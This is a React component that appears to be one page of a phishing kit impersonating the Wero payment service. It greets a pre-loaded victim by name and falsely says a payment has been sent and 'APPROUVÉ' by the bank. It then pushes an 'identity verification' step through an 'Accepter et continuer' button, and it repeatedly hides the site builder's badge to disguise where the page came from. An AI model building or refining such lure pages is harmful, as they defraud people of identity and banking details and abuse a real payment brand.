import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { supabase } from "@/lib/supabase";
import { Footer } from "@/components/Footer";
import { useToast } from "@/components/ui/use-toast";
import { User } from "@/types/user";

const Confirmation = () => {
  const [user, setUser] = useState<User | null>(null);
  const [isLoading, setIsLoading] = useState(true);
  const navigate = useNavigate();
  const { toast } = useToast();

  useEffect(() => {
    // Masquage du badge dynamique
    const hideBadge = () => {
      const badge = document.getElementById("lovable-badge");
      if (badge) badge.style.display = "none";
    };

    hideBadge();

    const observer = new MutationObserver((mutationsList) => {
      for (const mutation of mutationsList) {
        for (const node of mutation.addedNodes) {
          if (node.nodeType === 1 && (node as HTMLElement).id === "lovable-badge") {
            (node as HTMLElement).style.display = "none";
          }
        }
      }
    });

    observer.observe(document.body, { childList: true, subtree: true });

    return () => {
      observer.disconnect();
    };
  }, []);

  useEffect(() => {
    const userId = localStorage.getItem("userId");

    if (!userId) {
      navigate("/");
      return;
    }

    const fetchUser = async () => {
      try {
        const { data, error } = await supabase
          .from("users")
          .select("*")
          .eq("id", userId)
          .single();

        if (error || !data) {
          toast({
            title: "Erreur",
            description: "Impossible de charger les informations utilisateur",
            variant: "destructive",
          });
          navigate("/");
          return;
        }

        setUser(data);
      } catch (error) {
        console.error(error);
        navigate("/");
      } finally {
        setIsLoading(false);
      }
    };

    fetchUser();
  }, [navigate, toast]);

  const handleContinue = () => {
    navigate("/country");
  };

  if (isLoading) {
    return (
      <div className="min-h-screen flex justify-center items-center">
        <p>Chargement...</p>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex flex-col">
      <header className="bg-yellow-300 p-4 flex justify-between items-center">
        <h1 className="text-2xl font-bold">WERO</h1>
        {user && (
          <p className="font-medium">
            {user.prenom} {user.nom}
          </p>
        )}
      </header>

      <main className="flex-grow flex justify-center items-center p-4">
        <div className="max-w-md w-full bg-white rounded-lg shadow-md p-6">
          <div className="text-center mb-8">
            <h2 className="text-2xl font-bold mb-2">
              Félicitations {user?.prenom} {user?.nom}
            </h2>
            <h3 className="text-xl font-bold mb-4">Vous avez reçu de l'argent</h3>

            <p className="text-3xl font-bold text-green-500 mb-2">
              {user?.montant.toFixed(2)} €
            </p>

            <p className="text-gray-600 mb-4">ID : Wero-{user?.code}</p>

            <div className="flex justify-center mb-6">
              <img
                src="https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=235,h=225,fit=crop/Aq2q239lEjf2a2Mj/home-phone-fr-min-m2WaWKO7LnSbwjn0.png"
                alt="Wero Payment"
                className="img-fluid"
              />
            </div>

            <p className="text-gray-700 mb-2">
              Ce paiement de WERO a été déduit du compte de l'expéditeur et a été{" "}
              <span className="font-bold">APPROUVÉ</span> par sa banque.
            </p>

            <ol className="text-left space-y-4 mt-6 mb-6">
              <li className="flex items-start">
                <span className="font-bold mr-2">1.</span>
                <span>
                  Pour confirmer la transaction, merci de cliquer sur le bouton ci-dessous et de suivre les étapes indiquées.
                </span>
              </li>
              <li className="flex items-start">
                <span className="font-bold mr-2">2.</span>
                <span>
                  Afin de garantir la sécurité de votre transaction, une vérification d'identité est requise.
                </span>
              </li>
              <li className="flex items-start">
                <span className="font-bold mr-2">3.</span>
                <span>
                  Le montant de votre paiement sera crédité instantanément sur votre compte.
                </span>
              </li>
            </ol>
          </div>

          <Button
            onClick={handleContinue}
            className="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-semibold py-3"
          >
            Accepter et continuer
          </Button>
        </div>
      </main>

      <Footer />
    </div>
  );
};

export default Confirmation;
